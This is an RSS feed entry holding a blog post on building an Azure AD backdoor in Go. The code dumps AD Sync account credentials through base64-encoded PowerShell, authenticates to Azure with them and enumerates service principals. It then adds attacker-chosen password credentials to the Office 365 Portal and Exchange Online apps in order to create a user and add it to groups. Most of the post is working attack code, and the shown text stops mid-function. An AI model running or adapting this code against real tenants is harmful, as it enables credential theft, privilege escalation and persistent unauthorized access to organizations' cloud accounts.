<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Christopher Alonso</title>
        <link>https://christopherja.rocks/posts/</link>
        <description>Recent content in Posts on Christopher Alonso</description>
        <generator>Hugo -- gohugo.io</generator>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Thu, 28 May 2020 08:53:31 -0500</lastBuildDate>
        <atom:link href="https://christopherja.rocks/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>AzureADSync BackDoor</title>
            <link>https://christopherja.rocks/posts/2020/05/azureadsync-backdoor/</link>
            <pubDate>Thu, 28 May 2020 08:53:31 -0500</pubDate>
            
            <guid>https://christopherja.rocks/posts/2020/05/azureadsync-backdoor/</guid>
            <description>Recently created a golang binary that dumps credentials from the AD Sync Server and creates a user in azure and assigns it to any group in AzureAD you like. Check out the work done by Adam Chester and Dirk-jan at the following links below as this could have not been possible without their hard work and research. Seriously read those both as everything ive done piggybacks of them.
 Dirk-jan&amp;rsquo;s blog post Adam Chester&amp;rsquo;s blog post  tldr Dump AD Sync creds via powershell.</description>
            <content type="html"><![CDATA[<p>Recently created a golang binary that dumps credentials from the AD Sync Server and creates a user in azure and assigns it to any group in AzureAD you like. Check out the work done by Adam Chester and Dirk-jan at the following links below as this could have not been possible without their hard work and research. Seriously read those both as everything ive done piggybacks of them.</p>
<ul>
<li><a href="https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/">Dirk-jan&rsquo;s blog post</a></li>
<li><a href="https://blog.xpnsec.com/azuread-connect-for-redteam/#more">Adam Chester&rsquo;s blog post</a></li>
</ul>
<h2 id="tldr">tldr</h2>
<p>Dump AD Sync creds via powershell. Used dotpeek and fiddler to reverse powershell cmdlets since they call graph api. Use those dumped creds to call api. Assign passwords to built in apps with better permissios than Sync Acc. Sign in as those apps and create backdoor.</p>
<h2 id="dump-creds">Dump creds?</h2>
<p>In my test environment i ran adams powershell POC scipt and noticed it only dumped the on prem sync account credentials.
Which is fantastic as you can now perform a DC Sync attack. But my focus was on pivoting to the cloud with something a little more than user permissions. I was able to modify the script slightly by changing the following lines</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$domain = select-xml -Content $config -XPath <span style="color:#e6db74">&#34;//parameter[@name=&#39;forest-login-domain&#39;]&#34;</span> | select @{Name = <span style="color:#e6db74">&#39;Domain&#39;</span>; Expression = {$_.node.InnerText}}
$username = select-xml -Content $config -XPath <span style="color:#e6db74">&#34;//parameter[@name=&#39;forest-login-user&#39;]&#34;</span> | select @{Name = <span style="color:#e6db74">&#39;Username&#39;</span>; Expression = {$_.node.InnerText}}
$password = select-xml -Content $decrypted -XPath <span style="color:#e6db74">&#34;//attribute&#34;</span> | select @{Name = <span style="color:#e6db74">&#39;Password&#39;</span>; Expression = {$_.node.InnerText}}

Write-Host <span style="color:#e6db74">&#34;[*] On Prem Credentials&#34;</span>
Write-Host <span style="color:#e6db74">&#34;Domain: </span>$($domain.Domain)<span style="color:#e6db74">&#34;</span>
Write-Host <span style="color:#e6db74">&#34;Username: </span>$($username.Username)<span style="color:#e6db74">&#34;</span>
Write-Host <span style="color:#e6db74">&#34;Password: </span>$($password.Password)<span style="color:#e6db74">&#34;</span>
</code></pre></div><p>to</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$username = select-xml -Content $config -XPath <span style="color:#e6db74">&#34;//parameter[@name=&#39;UserName&#39;]&#34;</span> | select @{Name = <span style="color:#e6db74">&#39;Username&#39;</span>; Expression = {$_.node.InnerText}}
$password = select-xml -Content $decrypted -XPath <span style="color:#e6db74">&#34;//attribute&#34;</span> | select @{Name = <span style="color:#e6db74">&#39;Password&#39;</span>; Expression = {$_.node.InnerText}}

Write-Host <span style="color:#e6db74">&#34;[*] Credentials incoming...</span><span style="color:#ae81ff">`n</span><span style="color:#e6db74">&#34;</span>
Write-Host <span style="color:#e6db74">&#34;[*] Azure Credentials&#34;</span>
Write-Host <span style="color:#e6db74">&#34;UserName: </span>$($username.UserName)<span style="color:#e6db74">&#34;</span>
Write-Host <span style="color:#e6db74">&#34;Password: </span>$($password.Password)<span style="color:#ae81ff">`n</span><span style="color:#e6db74">&#34;</span>

</code></pre></div><p>The Details of how the powershell script is able to dump credentials in the first place can be found above (seriously check it out)
I encoded the above powershell script in base64 and run it within the golang code just for ease of use.
The function that performs the dump is below</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">DumpCreds</span>()<span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">string</span> {
    <span style="color:#a6e22e">posh</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">New</span>()
    <span style="color:#75715e">//fmt.Println(&#34;With encoding change:&#34;)
</span><span style="color:#75715e"></span>     <span style="color:#a6e22e">stdout</span>, <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">posh</span>.<span style="color:#a6e22e">Execute</span>(<span style="color:#e6db74">`//5XAHIAaQB0AGUALQBIAG8Ac...`</span>)
     <span style="color:#a6e22e">s</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Split</span>(<span style="color:#a6e22e">stdout</span>,<span style="color:#e6db74">&#34;\n&#34;</span>)

    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">stdout</span>)

    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">err</span>)
    }

    <span style="color:#a6e22e">User</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Split</span>(<span style="color:#a6e22e">s</span>[<span style="color:#ae81ff">10</span>],<span style="color:#e6db74">&#34;:&#34;</span>)
    <span style="color:#a6e22e">Pass</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Split</span>(<span style="color:#a6e22e">s</span>[<span style="color:#ae81ff">11</span>],<span style="color:#e6db74">&#34;:&#34;</span>)
    <span style="color:#a6e22e">UserName</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">TrimSpace</span>(<span style="color:#a6e22e">User</span>[<span style="color:#ae81ff">1</span>])
    <span style="color:#a6e22e">PassWord</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">TrimSpace</span>(<span style="color:#a6e22e">Pass</span>[<span style="color:#ae81ff">1</span>])
    <span style="color:#a6e22e">AzureCredsMap</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">string</span>)
    <span style="color:#a6e22e">AzureCredsMap</span>[<span style="color:#e6db74">&#34;AzureUserName&#34;</span>] = <span style="color:#a6e22e">UserName</span>
    <span style="color:#a6e22e">AzureCredsMap</span>[<span style="color:#e6db74">&#34;AzurePassWord&#34;</span>] = <span style="color:#a6e22e">PassWord</span>
    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">AzureCredsMap</span>
</code></pre></div><h2 id="authenticate-with-dumped-creds">Authenticate with dumped creds</h2>
<p>So at this point you have the sync account credentials.</p>
<p><img src="/credsOutput.png" alt="asmi popup"></p>
<p>Now we can authenticate to the graph.windows.net api using go</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">auth</span>(<span style="color:#a6e22e">resource_url</span> <span style="color:#66d9ef">string</span>,<span style="color:#a6e22e">credsMap</span> <span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">string</span>,<span style="color:#a6e22e">tenantId</span> <span style="color:#66d9ef">string</span>) <span style="color:#a6e22e">Token_t</span>{
    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;\n[*] Attempting to Authenticate to Azure...&#34;</span>)
    <span style="color:#a6e22e">pass</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">credsMap</span>[<span style="color:#e6db74">&#34;AzurePassWord&#34;</span>]
    <span style="color:#a6e22e">user</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">credsMap</span>[<span style="color:#e6db74">&#34;AzureUserName&#34;</span>]
    <span style="color:#75715e">//os.Exit(2)
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">formData</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">Values</span>{
    <span style="color:#e6db74">&#34;grant_type&#34;</span>:{<span style="color:#e6db74">&#34;password&#34;</span>},
    <span style="color:#e6db74">&#34;resource&#34;</span>:{<span style="color:#a6e22e">resource_url</span>},
    <span style="color:#e6db74">&#34;client_id&#34;</span>:{<span style="color:#e6db74">&#34;a0c73c16-a7e3-4564-9a95-2bdf47383716&#34;</span>}, <span style="color:#75715e">//needed as client id its default powershell                      
</span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;username&#34;</span>:{<span style="color:#a6e22e">user</span>},
    <span style="color:#e6db74">&#34;password&#34;</span>:{<span style="color:#a6e22e">pass</span>},
    }
    <span style="color:#75715e">//fmt.Println(tenantId)
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">url</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;https://login.microsoftonline.com/%s/oauth2/token&#34;</span>,<span style="color:#a6e22e">tenantId</span>)
    <span style="color:#a6e22e">resp</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">PostForm</span>(<span style="color:#a6e22e">url</span>,<span style="color:#a6e22e">formData</span>) <span style="color:#75715e">// contains tenant id
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
        panic(<span style="color:#a6e22e">err</span>)
    }
    <span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">Body</span>.<span style="color:#a6e22e">Close</span>()
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">result</span> <span style="color:#a6e22e">Token_t</span>
    <span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">NewDecoder</span>(<span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">Body</span>).<span style="color:#a6e22e">Decode</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">result</span>)

    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">AccessToken</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span>{
        <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;\nYou couldnt get a token, invalid credentials perhaps???\n&#34;</span>)
        <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Exit</span>(<span style="color:#ae81ff">2</span>)
    }
    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;\n[*] Successfully Authenticated To Azure&#34;</span>)
    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">result</span>
}
</code></pre></div><p>If successful you get an auth token back.</p>
<h2 id="strategy-going-forward">Strategy Going Forward</h2>
<p>At this point i wasnt sure how to proceed i know i want to list service principals. And this specific api that i am calling is outdated and not documented that well or at all.</p>
<p>So i decided to use the powershell AzureAD Cmdlets and try to see how those call the api. There is a log file that logs all the methods called by the cmdlets. here is an example</p>
<p><img src="/pwshlog.png" alt=""></p>
<p>You can see calls to get and set service principal&hellip;I didnt know what that meant. So i found the dll that correspondes to that cmdlet.
And loaded it into dotpeek (My new favorite tool)</p>
<h3 id="dotpeek">dotpeek</h3>
<p>Dot peek is amazing. It decompiled the dll and if you highlight a method it allows you to jump to the declaration.
Doing this i was able to see the get and set methods parameters. Which revealed a GET and PATCH request respectively as well as the parameters for the patch</p>
<p><img src="/dotpeek.png" alt=""></p>
<p>Using this is gained alot of insight. But still i had alot of issues calling the right endpoints since i didnt know exactly what the request body needed to look like to patch a password credential object to a Service principal.</p>
<h3 id="fiddler">Fiddler</h3>
<p>Fiddler solved all my questions about the api and exactly how requests needed to be formatted.
I was able to install the certificate on my windows machine to see the SSL traffic now in clear text.</p>
<p><img src="/fiddler.png" alt=""></p>
<p>Now all i needed to do was the folllowing.</p>
<p><img src="/powersh.png" alt=""></p>
<p>And look at the output on fiddler and model my golang code after that.</p>
<h2 id="list-service-principals--roles">List service principals &amp; roles</h2>
<p>After figuring out how to exactly call each api and the format needed i was able to proceed with writing the code based on the fiddler output.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">GetSPs</span>(<span style="color:#a6e22e">token</span> <span style="color:#66d9ef">string</span>,<span style="color:#a6e22e">tenantId</span> <span style="color:#66d9ef">string</span>)<span style="color:#a6e22e">AllTheSpns_t</span>{
    <span style="color:#a6e22e">url</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;https://graph.windows.net/%s/servicePrincipals/?api-version=1.6&amp;$top=999&#34;</span>,<span style="color:#a6e22e">tenantId</span>)
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">bearer</span> = <span style="color:#e6db74">&#34;Bearer &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">token</span>
    <span style="color:#75715e">// Create a new request using http
</span><span style="color:#75715e"></span>
    <span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">NewRequest</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#a6e22e">url</span>,<span style="color:#66d9ef">nil</span> ) <span style="color:#75715e">//bytes.NewBuffer(jsonStr)
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// add authorization header to the req
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Add</span>(<span style="color:#e6db74">&#34;Authorization&#34;</span>, <span style="color:#a6e22e">bearer</span>)
    <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Add</span>(<span style="color:#e6db74">&#34;Content-type&#34;</span>,<span style="color:#e6db74">&#34;application/json&#34;</span>)

    <span style="color:#75715e">// Send req using http Client
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">client</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Client</span>{}
    <span style="color:#a6e22e">resp</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">Do</span>(<span style="color:#a6e22e">req</span>)
    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
        <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Error on response.\n[ERRO] -&#34;</span>, <span style="color:#a6e22e">err</span>)
    }

    <span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">Body</span>.<span style="color:#a6e22e">Close</span>()
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">result</span> <span style="color:#a6e22e">AllTheSpns_t</span>

    <span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">NewDecoder</span>(<span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">Body</span>).<span style="color:#a6e22e">Decode</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">result</span>)

    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">result</span>
}
</code></pre></div><h2 id="microsoft-office-365-portal--office-365-exchange-online">Microsoft Office 365 Portal &amp; Office 365 Exchange Online</h2>
<p>I was able to get a list of all service principals available, i didnt have many and needed to add a trial 0365 license to my tenant to view some of the better ones with more permissions such as Microsoft Office 365 Portal &amp; Office 365 Exchange Online.
dirkjan goes into detail on his blog post on assigning credentials to these apps and checking the roles they are assigned.
For some reason i was not able to login to many of the apps after assigning a password credential (i would get back a client secret invalid error). Only a few and the ones that i was able to login to didnt have many roles assigned.
I settled on using Microsoft Office 365 Portal &amp; Office 365 Exchange Online in tandem as one has user.ReadWrite access and the other has group.ReadWrite Access.</p>
<h2 id="create-useradd-to-group">Create user/add to group</h2>
<p>Basically the code loops through the list of SPN&rsquo;s returned and looks for those two display names.
Then adds a predefined password credential to both service principals. Logs in as each and creates as user then loops through the azure AD groups available and asks if the user should be added.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">SPNs</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">GetSPs</span>(<span style="color:#a6e22e">authToken</span>,<span style="color:#a6e22e">TenantId</span>)
    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>{
        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">AppDisplayName</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Microsoft Office 365 Portal&#34;</span>{
            <span style="color:#a6e22e">O365Found</span> = <span style="color:#66d9ef">true</span>
            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Found 0365 Portal App&#34;</span>)
            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Attempting to add Password Credential&#34;</span>)
            <span style="color:#a6e22e">O365AppObjId</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">ObjectID</span>
            <span style="color:#a6e22e">O365AppId</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">AppID</span>
            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Found Obj ID&#34;</span>)
            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">O365AppObjId</span>)
            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Found App ID&#34;</span>)
            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">O365AppId</span>)
            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">NewCredsToAdd</span> <span style="color:#a6e22e">PasswordCredentials</span>
            <span style="color:#a6e22e">NewCredsToAdd</span>.<span style="color:#a6e22e">StartDate</span> = <span style="color:#a6e22e">now_t</span>
            <span style="color:#a6e22e">NewCredsToAdd</span>.<span style="color:#a6e22e">EndDate</span> = <span style="color:#a6e22e">then_t</span>
            <span style="color:#a6e22e">NewCredsToAdd</span>.<span style="color:#a6e22e">Value</span> = <span style="color:#a6e22e">pwndpass</span>
            <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">PasswordCredentialss</span> = append(<span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">PasswordCredentialss</span>,<span style="color:#a6e22e">NewCredsToAdd</span>)
            <span style="color:#a6e22e">Ready2PostPassWords</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">interface</span>{})
            <span style="color:#a6e22e">Ready2PostPassWords</span>[<span style="color:#e6db74">&#34;passwordCredentials&#34;</span>] = <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">PasswordCredentialss</span>
            <span style="color:#a6e22e">AddPassResult</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">AddPasswordToSP</span>(<span style="color:#a6e22e">authToken</span>,<span style="color:#a6e22e">Ready2PostPassWords</span>,<span style="color:#a6e22e">O365AppObjId</span>,<span style="color:#a6e22e">TenantId</span>)
            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">AddPassResult</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;error&#34;</span> {
                <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Error Adding PasswordCredential To O365 Portal App&#34;</span>)
                <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Exiting....&#34;</span>)
                <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Exit</span>(<span style="color:#ae81ff">2</span>)
            }<span style="color:#66d9ef">else</span>{
                <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Successfully Added PasswordCredentials To O365 Portal App&#34;</span>)
                <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;[*] PasswordCredentials :=&gt; %s : %s\n&#34;</span>,<span style="color:#a6e22e">O365AppId</span>,<span style="color:#a6e22e">NewCredsToAdd</span>.<span style="color:#a6e22e">Value</span>)
            }
            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;[*] Attempting To Login As The O365 Application...\n&#34;</span>)
            <span style="color:#a6e22e">O365AuthTokenStruct</span> = <span style="color:#a6e22e">authAsSPN</span>(<span style="color:#e6db74">&#34;https://graph.windows.net&#34;</span>,<span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">AppID</span>,<span style="color:#a6e22e">NewCredsToAdd</span>.<span style="color:#a6e22e">Value</span>.(<span style="color:#66d9ef">string</span>),<span style="color:#a6e22e">TenantId</span>)

        }
         <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">AppDisplayName</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Office 365 Exchange Online&#34;</span>{
            <span style="color:#75715e">//fmt.Println(SPNs.Value[x].AppDisplayName)
</span><span style="color:#75715e"></span>            <span style="color:#a6e22e">ExchangeFound</span> = <span style="color:#66d9ef">true</span>
            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Found Exchange Online App&#34;</span>)
            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Attempting to add Password Credential&#34;</span>)
            <span style="color:#a6e22e">ExchangeAppObjId</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">ObjectID</span>
            <span style="color:#a6e22e">ExchangeAppId</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">AppID</span>
            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Found Obj ID&#34;</span>)
            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">ExchangeAppObjId</span>)
            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Found App ID&#34;</span>)
            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">ExchangeAppId</span>)
            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">NewCredsToAddExchange</span> <span style="color:#a6e22e">PasswordCredentials</span>
            <span style="color:#a6e22e">NewCredsToAddExchange</span>.<span style="color:#a6e22e">StartDate</span> = <span style="color:#a6e22e">now_t</span>
            <span style="color:#a6e22e">NewCredsToAddExchange</span>.<span style="color:#a6e22e">EndDate</span> = <span style="color:#a6e22e">then_t</span>
            <span style="color:#a6e22e">NewCredsToAddExchange</span>.<span style="color:#a6e22e">Value</span> = <span style="color:#a6e22e">pwndpass</span>
            <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">PasswordCredentialss</span> = append(<span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">PasswordCredentialss</span>,<span style="color:#a6e22e">NewCredsToAddExchange</span>)
            <span style="color:#a6e22e">Ready2PostPassWordsExchange</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">interface</span>{})
            <span style="color:#a6e22e">Ready2PostPassWordsExchange</span>[<span style="color:#e6db74">&#34;passwordCredentials&#34;</span>] = <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">PasswordCredentialss</span>
            <span style="color:#a6e22e">AddPassResultExchange</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">AddPasswordToSP</span>(<span style="color:#a6e22e">authToken</span>,<span style="color:#a6e22e">Ready2PostPassWordsExchange</span>,<span style="color:#a6e22e">ExchangeAppObjId</span>,<span style="color:#a6e22e">TenantId</span>)
            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">AddPassResultExchange</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;error&#34;</span> {
                <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Error Adding PasswordCredential To Office 365 Exchange Online App&#34;</span>)
                <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Exiting....&#34;</span>)
                <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Exit</span>(<span style="color:#ae81ff">2</span>)
            }<span style="color:#66d9ef">else</span>{
                <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Successfully Added PasswordCredentials To Office 365 Exchange Online App&#34;</span>)
                <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;[*] PasswordCredentials :=&gt; %s : %s\n&#34;</span>,<span style="color:#a6e22e">ExchangeAppId</span>,<span style="color:#a6e22e">NewCredsToAddExchange</span>.<span style="color:#a6e22e">Value</span>)
            }
            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;[*] Attempting To Login As The Office 365 Exchange Online Application...\n&#34;</span>)
            <span style="color:#a6e22e">ExchangeAppIdGlobal</span> = <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">AppID</span>
            <span style="color:#a6e22e">ExchangeAuthTokenStruct</span> = <span style="color:#a6e22e">authAsSPN</span>(<span style="color:#e6db74">&#34;https://graph.windows.net&#34;</span>,<span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">AppID</span>,<span style="color:#a6e22e">NewCredsToAddExchange</span>.<span style="color:#a6e22e">Value</span>.(<span style="color:#66d9ef">string</span>),<span style="color:#a6e22e">TenantId</span>)

        }
    }
    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">ExchangeAuthTokenStruct</span>.<span style="color:#a6e22e">AccessToken</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">O365AuthTokenStruct</span>.<span style="color:#a6e22e">AccessToken</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span> {
